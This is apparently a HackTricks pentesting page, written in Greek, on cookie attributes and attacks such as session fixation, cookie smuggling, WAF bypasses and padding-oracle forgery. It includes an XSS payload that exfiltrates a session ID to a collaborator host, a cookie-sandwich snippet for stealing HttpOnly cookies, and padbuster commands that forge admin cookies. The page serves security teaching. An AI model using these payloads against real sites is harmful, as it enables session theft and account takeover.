# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Τα cookies έρχονται με διάφορα χαρακτηριστικά που ελέγχουν τη συμπεριφορά τους στο πρόγραμμα περιήγησης του χρήστη. Εδώ ακολουθεί μια επισκόπηση αυτών των χαρακτηριστικών σε πιο παθητική διατύπωση:

### Expires and Max-Age

Η ημερομηνία λήξης ενός cookie καθορίζεται από το `Expires` attribute. Αντίθετα, το `Max-age` attribute ορίζει τον χρόνο σε δευτερόλεπτα μέχρι να διαγραφεί ένα cookie. **Προτιμήστε το `Max-age` καθώς αντανακλά πιο σύγχρονες πρακτικές.**

### Domain

Οι hosts που θα λάβουν ένα cookie καθορίζονται από το `Domain` attribute. Από προεπιλογή, αυτό ορίζεται στον host που εξέδωσε το cookie, χωρίς να περιλαμβάνονται τα subdomains του. Ωστόσο, όταν το `Domain` attribute ορίζεται ρητά, καλύπτει και τα subdomains. Αυτό καθιστά τη ρητή δήλωση του `Domain` λιγότερο περιοριστική επιλογή, χρήσιμη σε σενάρια όπου απαιτείται κοινή χρήση cookie μεταξύ subdomains. Για παράδειγμα, το `Domain=mozilla.org` καθιστά τα cookies προσβάσιμα και σε subdomains όπως `developer.mozilla.org`.

### Path

Το `Path` attribute υποδεικνύει ένα συγκεκριμένο URL path που πρέπει να υπάρχει στο ζητούμενο URL για να σταλεί το `Cookie` header. Αυτό το attribute θεωρεί τον χαρακτήρα `/` ως διαχωριστικό φακέλου, επιτρέποντας επίσης αντιστοιχίσεις σε υποφακέλους.

### Ordering Rules

Όταν δύο cookies έχουν το ίδιο όνομα, επιλέγεται για αποστολή αυτό που βασίζεται σε:

- Το cookie που ταιριάζει στον μεγαλύτερο path στο ζητούμενο URL.
- Το πιο πρόσφατα ορισμένο cookie εάν τα paths είναι ίδια.

### SameSite

- Το `SameSite` attribute καθορίζει αν τα cookies αποστέλλονται σε αιτήματα που προέρχονται από third-party domains. Προσφέρει τρεις ρυθμίσεις:
- **Strict**: Περιορίζει το cookie ώστε να μην αποστέλλεται σε third-party αιτήματα.
- **Lax**: Επιτρέπει το cookie να αποστέλλεται με GET αιτήματα που ξεκινούν από third-party ιστοσελίδες.
- **None**: Επιτρέπει το cookie να αποστέλλεται από οποιοδήποτε third-party domain.

Να θυμάστε ότι κατά τη διαμόρφωση των cookies, η κατανόηση αυτών των attributes μπορεί να βοηθήσει ώστε να συμπεριφέρονται όπως αναμένεται σε διαφορετικά σενάρια.

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
A cookie with _**SameSite**_ attribute will **mitigate CSRF attacks** where a logged session is needed.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Σημειώστε ότι προσωρινά, μετά την εφαρμογή αυτής της αλλαγής, τα **cookies χωρίς πολιτική SameSite** στο Chrome θα **αντιμετωπίζονται ως None** κατά τα **πρώτα 2 λεπτά** και στη συνέχεια ως Lax για κορυφαία cross-site POST αιτήματα.

## Cookies Flags

### HttpOnly

Αυτό εμποδίζει τον **client** από την πρόσβαση στο cookie (π.χ. μέσω **Javascript**: `document.cookie`)

#### **Παρακάμψεις**

- Αν η σελίδα **επιστρέφει τα cookies ως απόκριση** σε ένα request (για παράδειγμα σε μια **PHPinfo** σελίδα), είναι δυνατό να γίνει κατάχρηση του XSS για να σταλεί ένα αίτημα σε αυτή τη σελίδα και να **κλαπούν τα cookies** από την απόκριση (βλέπε παράδειγμα στο [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Αυτό μπορεί να παρακαμφθεί με **TRACE** **HTTP** requests αφού η απόκριση από τον server (αν αυτή η HTTP μέθοδος είναι διαθέσιμη) θα αντικατοπτρίζει τα αποσταλμένα cookies. Αυτή η τεχνική ονομάζεται **Cross-Site Tracking**.
- Αυτή η τεχνική αποφεύγεται από **σύγχρονα browsers που δεν επιτρέπουν την αποστολή TRACE** αιτήματος από JS. Ωστόσο, έχουν βρεθεί μερικές παρακάμψεις σε συγκεκριμένο λογισμικό, όπως η αποστολή `\r\nTRACE` αντί για `TRACE` στο IE6.0 SP2.
- Ένας άλλος τρόπος είναι η εκμετάλλευση zero/day ευπαθειών στους browsers.
- Είναι δυνατό να **υπεργραφούν HttpOnly cookies** εκτελώντας μια επίθεση Cookie Jar overflow:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Είναι δυνατό να χρησιμοποιηθεί επίθεση [**Cookie Smuggling**](#cookie-smuggling) για την εξαγωγή αυτών των cookies
- Εάν κάποιο server-side endpoint echo-άρει το raw session ID στην HTTP απόκριση (π.χ. μέσα σε σχόλια HTML ή σε ένα debug block), μπορείτε να παρακάμψετε το HttpOnly χρησιμοποιώντας ένα XSS gadget για να κάνετε fetch το endpoint, να ανακτήσετε το secret με regex, και να το εξαγάγετε. Παράδειγμα μοτίβου XSS payload:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Ασφαλές

Το αίτημα θα στείλει το cookie **μόνο** σε ένα HTTP request αν το αίτημα μεταδοθεί μέσω ασφαλούς καναλιού (συνήθως **HTTPS**).

## Cookies Prefixes

Τα cookies που έχουν πρόθεμα `__Secure-` απαιτείται να οριστούν μαζί με την επισήμανση `secure` από σελίδες που προστατεύονται από HTTPS.

Για τα cookies με πρόθεμα `__Host-`, πρέπει να ικανοποιηθούν οι εξής προϋποθέσεις:

- Πρέπει να οριστούν με την επισήμανση `secure`.
- Πρέπει να προέρχονται από σελίδα που προστατεύεται από HTTPS.
- Απαγορεύεται να καθορίζουν domain, αποτρέποντας έτσι τη μετάδοσή τους σε subdomains.
- Το path για αυτά τα cookies πρέπει να οριστεί σε `/`.

Είναι σημαντικό να σημειωθεί ότι τα cookies με πρόθεμα `__Host-` δεν επιτρέπεται να αποστέλλονται σε superdomains ή subdomains. Αυτός ο περιορισμός βοηθά στην απομόνωση των application cookies. Συνεπώς, η χρήση του προθέματος `__Host-` για όλα τα application cookies μπορεί να θεωρηθεί καλή πρακτική για την ενίσχυση της ασφάλειας και της απομόνωσης.

### Overwriting cookies

Ένα από τα μέτρα προστασίας των cookies με πρόθεμα `__Host-` είναι η αποτροπή της επεγγραφής τους από subdomains. Αποτρέπει, για παράδειγμα, τις [**Cookie Tossing attacks**](cookie-tossing.md). Στην ομιλία [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) παρουσιάζεται ότι ήταν εφικτό να οριστούν `\_\_HOST-` prefixed cookies από subdomain, με το να παραπλανηθεί ο parser — για παράδειγμα, προσθέτοντας "=" στην αρχή ή στην αρχή και στο τέλος...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ή σε PHP ήταν εφικτό να προστεθούν **άλλοι χαρακτήρες στην αρχή** του ονόματος του cookie που θα **αντικαθιστώνταν από underscore** χαρακτήρες, επιτρέποντας την επεγγραφή των `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>

## Cookies Attacks

Αν ένα custom cookie περιέχει ευαίσθητα δεδομένα, ελέγξτε το (ειδικά αν παίζετε ένα CTF), καθώς μπορεί να είναι ευάλωτο.

### Decoding and Manipulating Cookies

Τα ευαίσθητα δεδομένα ενσωματωμένα σε cookies πρέπει πάντα να εξετάζονται προσεκτικά. Τα cookies που είναι κωδικοποιημένα σε Base64 ή σε παρόμοια φορμά συχνά μπορούν να αποκωδικοποιηθούν. Αυτή η ευπάθεια επιτρέπει σε έναν επιτιθέμενο να αλλάξει το περιεχόμενο του cookie και να μιμηθεί άλλους χρήστες κωδικοποιώντας ξανά τα τροποποιημένα δεδομένα στο cookie.

### Session Hijacking

Αυτή η επίθεση περιλαμβάνει την κλοπή του cookie ενός χρήστη για να αποκτηθεί μη εξουσιοδοτημένη πρόσβαση στον λογαριασμό του μέσα σε μια εφαρμογή. Χρησιμοποιώντας το κλεμμένο cookie, ένας επιτιθέμενος μπορεί να μιμηθεί τον νόμιμο χρήστη.

### Session Fixation

Σε αυτό το σενάριο, ένας επιτιθέμενος παγιδεύει ένα θύμα ώστε να χρησιμοποιήσει ένα συγκεκριμένο cookie για να κάνει login. Αν η εφαρμογή δεν εκχωρήσει νέο cookie κατά το login, ο επιτιθέμενος, κατέχοντας το αρχικό cookie, μπορεί να μιμηθεί το θύμα. Αυτή η τεχνική βασίζεται στο ότι το θύμα κάνει login με cookie που παρείχε ο επιτιθέμενος.

Αν βρήκατε ένα **XSS σε subdomain** ή **ελέγχετε ένα subdomain**, διαβάστε:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Εδώ, ο επιτιθέμενος πείθει το θύμα να χρησιμοποιήσει το session cookie του επιτιθέμενου. Το θύμα, πιστεύοντας ότι έχει συνδεθεί στον δικό του λογαριασμό, άθελά του θα εκτελεί ενέργειες στο πλαίσιο του λογαριασμού του επιτιθέμενου.

Αν βρήκατε ένα **XSS σε subdomain** ή **ελέγχετε ένα subdomain**, διαβάστε:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Κάντε κλικ στον προηγούμενο σύνδεσμο για να έχετε πρόσβαση σε μια σελίδα που εξηγεί πιθανά σφάλματα στα JWT.

Τα JSON Web Tokens (JWT) που χρησιμοποιούνται σε cookies μπορούν επίσης να παρουσιάσουν ευπάθειες. Για λεπτομερείς πληροφορίες σχετικά με πιθανές αδυναμίες και τρόπους εκμετάλλευσης, συνίσταται να ανατρέξετε στο συνδεδεμένο έγγραφο για hacking JWT.

### Cross-Site Request Forgery (CSRF)

Αυτή η επίθεση αναγκάζει έναν ήδη συνδεδεμένο χρήστη να εκτελέσει ανεπιθύμητες ενέργειες σε μια web εφαρμογή στην οποία είναι αυτή τη στιγμή αυθεντικοποιημένος. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν cookies που αποστέλλονται αυτόματα με κάθε αίτημα προς τον ευάλωτο ιστότοπο.

### Empty Cookies

(Δείτε περισσότερες λεπτομέρειες στην [original research](https://blog.ankursundara.com/cookie-bugs/)) Τα browsers επιτρέπουν τη δημιουργία cookies χωρίς όνομα, κάτι που μπορεί να επιδειχθεί μέσω JavaScript ως εξής:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Το αποτέλεσμα στην αποστελλόμενη cookie header είναι `a=v1; test value; b=v2;`. Παραδόξως, αυτό επιτρέπει τη χειραγώγηση των cookies αν οριστεί ένα cookie με κενό όνομα, πιθανώς επιτρέποντας τον έλεγχο άλλων cookies ορίζοντας το κενό cookie σε μια συγκεκριμένη τιμή:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Αυτό οδηγεί στο να στέλνει το πρόγραμμα περιήγησης ένα cookie header που ερμηνεύεται από κάθε web server ως cookie με όνομα `a` και τιμή `b`.

#### Chrome — Πρόβλημα με Unicode Surrogate Codepoint

Στο Chrome, αν ένας Unicode surrogate codepoint είναι μέρος ενός set cookie, `document.cookie` διαφθείρεται, επιστρέφοντας στη συνέχεια ένα κενό string:
```js
document.cookie = "\ud800=meep"
```
Αυτό έχει ως αποτέλεσμα το `document.cookie` να εμφανίζει κενή συμβολοσειρά, υποδεικνύοντας μόνιμη αλλοίωση.

#### Cookie Smuggling Εξαιτίας προβλημάτων ανάλυσης

(Δείτε περισσότερες λεπτομέρειες στην[original research](https://blog.ankursundara.com/cookie-bugs/)) Πολλοί web servers, συμπεριλαμβανομένων εκείνων από Java (Jetty, TomCat, Undertow) και Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), χειρίζονται λανθασμένα cookie strings εξαιτίας παλαιωμένης υποστήριξης RFC2965. Διαβάζουν μια double-quoted cookie value ως μια ενιαία τιμή ακόμη κι αν περιέχει ';', που κανονικά θα πρέπει να διαχωρίζει key-value pairs:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Η εσφαλμένη ανάλυση των cookies από διακομιστές, ιδιαίτερα Undertow, Zope και εκείνους που χρησιμοποιούν Python's `http.cookie.SimpleCookie` και `http.cookie.BaseCookie`, δημιουργεί ευκαιρίες για cookie injection attacks. Αυτοί οι διακομιστές δεν οριοθετούν σωστά την έναρξη νέων cookies, επιτρέποντας σε επιτιθέμενους να spoof cookies:

- Undertow expects a new cookie immediately after a quoted value without a semicolon.
- Zope looks for a comma to start parsing the next cookie.
- Python's cookie classes start parsing on a space character.

Αυτή η ευπάθεια είναι ιδιαίτερα επικίνδυνη σε web applications που βασίζονται σε cookie-based CSRF protection, καθώς επιτρέπει σε επιτιθέμενους να εισάγουν spoofed CSRF-token cookies και δυνητικά να παρακάμψουν μέτρα ασφαλείας. Το πρόβλημα επιδεινώνεται από τον τρόπο που η Python χειρίζεται duplicate cookie names, όπου η τελευταία εμφάνιση υπερισχύει των προηγούμενων. Επιπλέον δημιουργεί ανησυχίες για `__Secure-` και `__Host-` cookies σε insecure contexts και μπορεί να οδηγήσει σε authorization bypasses όταν cookies προωθούνται σε back-end servers ευάλωτους σε spoofing.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), μπορεί να είναι δυνατό να χρησιμοποιηθεί το cookie attribute **`$Version=1`** για να κάνει το backend να χρησιμοποιήσει παλαιότερη λογική για να parse το cookie λόγω του **RFC2109**. Επιπλέον, άλλες τιμές όπως **`$Domain`** και **`$Path`** μπορούν να χρησιμοποιηθούν για να τροποποιήσουν τη συμπεριφορά του backend μέσω του cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) είναι δυνατό να χρησιμοποιηθεί η τεχνική cookie sandwich για να κλαπούν HttpOnly cookies. Αυτά είναι τα requirements και τα steps:

- Βρείτε ένα σημείο όπου ένα φαινομενικά άχρηστο **cookie is reflected in the response**
- **Create a cookie called `$Version`** με value `1` (you can do this in a XSS attack from JS) με πιο συγκεκριμένο path ώστε να πάρει την αρχική position (κάποια frameworks όπως python δεν χρειάζονται αυτό το βήμα)
- **Create the cookie that is reflected** με μια τιμή που αφήνει ένα **open double quotes** και με συγκεκριμένο path ώστε να τοποθετηθεί στην cookie db μετά από το προηγούμενο (`$Version`)
- Στη συνέχεια, το legit cookie θα εμφανιστεί μετά στη σειρά
- **Create a dummy cookie that closes the double quotes** μέσα στην τιμή του

Με αυτόν τον τρόπο το victim cookie παγιδεύεται μέσα στο νέο cookie version 1 και θα επιστρέφεται κάθε φορά που γίνεται reflection.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Ελέγξτε την προηγούμενη ενότητα.

#### Bypassing value analysis with quoted-string encoding

Αυτή η parsing υποδεικνύει να γίνει unescape των escaped τιμών μέσα στα cookies, οπότε "\a" γίνεται "a". Αυτό μπορεί να είναι χρήσιμο για να παρακαμφθούν οι WAFs όπως:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

Στο RFC2109 αναφέρεται ότι ένα **comma can be used as a separator between cookie values**. Και επίσης είναι δυνατό να προστεθούν **spaces and tabs before an after the equal sign**. Επομένως ένα cookie όπως `$Version=1; foo=bar, abc = qux` δεν παράγει το cookie `"foo":"bar, admin = qux"` αλλά τα cookies `foo":"bar"` και `"admin":"qux"`. Παρατηρήστε πώς δημιουργούνται 2 cookies και πώς το admin έχασε το κενό πριν και μετά το σύμβολο ίσον.

#### Bypassing value analysis with cookie splitting

Τέλος, διάφορα backdoors θα ενώσουν σε ένα string διαφορετικά cookies που περάστηκαν σε διαφορετικά cookie headers όπως στο:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Το οποίο θα μπορούσε να επιτρέψει την παράκαμψη ενός WAF όπως στο παρακάτω παράδειγμα:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Επιπλέον Έλεγχοι Ευάλωτων Cookies

#### **Βασικοί έλεγχοι**

- Το **cookie** είναι το **ίδιο** κάθε φορά που κάνετε **login**.
- Log out και δοκιμάστε να χρησιμοποιήσετε το ίδιο cookie.
- Προσπαθήστε να κάνετε login με 2 συσκευές (ή browsers) στον ίδιο λογαριασμό χρησιμοποιώντας το ίδιο cookie.
- Ελέγξτε αν το cookie περιέχει οποιαδήποτε πληροφορία και δοκιμάστε να την τροποποιήσετε.
- Προσπαθήστε να δημιουργήσετε πολλούς accounts με σχεδόν ίδιο username και δείτε αν μπορείτε να εντοπίσετε ομοιότητες.
- Ελέγξτε την επιλογή «**remember me**» αν υπάρχει για να δείτε πώς λειτουργεί. Αν υπάρχει και μπορεί να είναι ευάλωτη, χρησιμοποιήστε πάντα το cookie του **remember me** χωρίς κανένα άλλο cookie.
- Ελέγξτε αν το προηγούμενο cookie λειτουργεί ακόμα και μετά την αλλαγή του password.

#### **Προχωρημένες επιθέσεις σε cookies**

Αν το cookie παραμένει το ίδιο (ή σχεδόν) όταν κάνετε log in, αυτό πιθανότατα σημαίνει ότι το cookie σχετίζεται με κάποιο πεδίο του λογαριασμού σας (πιθανώς το username). Τότε μπορείτε:

- Προσπαθήστε να δημιουργήσετε πολλούς **accounts** με πολύ **παρόμοια** usernames και δοκιμάστε να **μαντέψετε** πώς λειτουργεί ο αλγόριθμος.
- Προσπαθήστε να **bruteforce the username**. Αν το cookie αποθηκεύεται μόνο ως μέθοδος authentication για το username σας, τότε μπορείτε να δημιουργήσετε έναν account με username "**Bmin**" και να **bruteforce** κάθε μεμονωμένο **bit** του cookie σας επειδή ένα από τα cookies που θα δοκιμάσετε θα είναι αυτό που ανήκει στον "**admin**".
- Δοκιμάστε **Padding** **Oracle** (μπορείτε να αποκρυπτογραφήσετε το περιεχόμενο του cookie). Χρησιμοποιήστε **padbuster**.

**Padding Oracle - Padbuster παραδείγματα**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster θα κάνει αρκετές προσπάθειες και θα σας ρωτήσει ποια κατάσταση είναι η κατάσταση σφάλματος (η οποία δεν είναι έγκυρη).

Στη συνέχεια θα ξεκινήσει το decrypting του cookie (μπορεί να χρειαστεί μερικά λεπτά)

Αν η attack έχει εκτελεστεί με επιτυχία, τότε μπορείτε να δοκιμάσετε να encrypt μια συμβολοσειρά της επιλογής σας. Για παράδειγμα, αν θέλετε να **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Αυτή η εκτέλεση θα σου δώσει το cookie σωστά κρυπτογραφημένο και κωδικοποιημένο με τη συμβολοσειρά **user=administrator** μέσα.

**CBC-MAC**

Μπορεί ένα cookie να έχει κάποια τιμή και να υπογράφεται χρησιμοποιώντας CBC. Τότε, η ακεραιότητα της τιμής είναι η υπογραφή που δημιουργείται με χρήση CBC πάνω στην ίδια την τιμή. Δεδομένου ότι συνιστάται να χρησιμοποιείται ως IV ένα μηδενικό διάνυσμα, αυτός ο τύπος ελέγχου ακεραιότητας μπορεί να είναι ευάλωτος.

**The attack**

1. Πάρε την υπογραφή για το username **administ** = **t**
2. Πάρε την υπογραφή για το username **rator\x00\x00\x00 XOR t** = **t'**
3. Θέσε στο cookie την τιμή **administrator+t'** (**t'** θα είναι μια έγκυρη υπογραφή του **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

If the cookie is encrypted using ECB it could be vulnerable.\
Όταν συνδέεσαι το cookie που λαμβάνεις πρέπει να είναι πάντα το ίδιο.

How to detect and attack:

Δημιούργησε 2 users με σχεδόν τα ίδια δεδομένα (username, password, email, etc.) και προσπάθησε να ανακαλύψεις κάποιο μοτίβο μέσα στο δοθέν cookie

Δημιούργησε έναν user με όνομα για παράδειγμα "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" και έλεγξε αν υπάρχει κάποιο μοτίβο στο cookie (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).

Θα πρέπει να υπάρχει ένα μοτίβο (με το μέγεθος του used block). So, knowing how are a bunch of "a" encrypted you can create a username: "a"\*(size of the block)+"admin". Έπειτα, μπορείς να διαγράψεις το κρυπτογραφημένο μοτίβο ενός block από "a" από το cookie. Και θα έχεις το cookie του username "admin".

## References

- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#include ../../banners/hacktricks-training.md}}
